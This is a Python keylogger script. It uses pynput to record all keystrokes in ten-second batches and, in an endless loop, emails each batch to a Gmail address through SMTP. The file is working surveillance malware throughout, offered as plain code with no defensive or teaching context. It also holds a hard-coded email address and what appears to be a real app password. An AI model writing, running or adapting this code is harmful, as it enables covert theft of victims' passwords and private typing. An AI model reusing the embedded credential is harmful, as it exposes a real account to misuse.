import smtplib
from pynput import keyboard
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
import threading
import time

result = ""
stop_listener = False

def on_press(key):
    global result, stop_listener
    try:
        result += key.char
    except AttributeError:
        if key == keyboard.Key.space:
            result += " "
        elif key == keyboard.Key.esc:
            stop_listener = True  # Stop the listener when Escape key is pressed
        else:
            result += f" {key} "
    print(result)

def function_call():
    global stop_listener, result
    result = ""  # Reset result for new capture session
    stop_listener = False  # Reset stop flag
    listener = keyboard.Listener(on_press=on_press)
    listener.start()

    # Wait for some time or condition
    timeout = 10  # seconds
    start_time = time.time()
    while time.time() - start_time < timeout and not stop_listener:
        time.sleep(0.1)

    listener.stop()
    listener.join()
    return result

def send_email(body):
    # Email credentials
    sender_email = "mperarasu10@gmail.com"
    receiver_email = "mperarasu10@gmail.com"
    password = "bswltvlfmnhnckaa"

    # Email content
    subject = "Test Email"

    # Create a MIMEText object
    msg = MIMEMultipart()
    msg['From'] = sender_email
    msg['To'] = receiver_email
    msg['Subject'] = subject

    # Attach the body with the msg instance
    msg.attach(MIMEText(body, 'plain'))

    # SMTP server configuration
    smtp_server = "smtp.gmail.com"
    port = 465  # For SSL

    # Create a secure SSL context
    print("Creating SSL context...")
    context = smtplib.ssl.create_default_context()

    try:
        print("Connecting to the server...")
        with smtplib.SMTP_SSL(smtp_server, port, context=context) as server:
            print("Connected to the server.")
            
            print("Logging in...")
            server.login(sender_email, password)
            print("Logged in successfully.")
            
            print("Sending email...")
            server.sendmail(sender_email, receiver_email, msg.as_string())
            print("Email sent successfully!")
            
    except smtplib.SMTPConnectError:
        print("Failed to connect to the server. Wrong server address or port.")
    except smtplib.SMTPAuthenticationError:
        print("Failed to authenticate. Wrong email or password.")
    except smtplib.SMTPException as e:
        print(f"SMTP error occurred: {e}")
    except Exception as e:
        print(f"An error occurred: {e}")

while True:
    # Capture keyboard input
    body = function_call()
    
    # Send email with the captured input
    send_email(body)
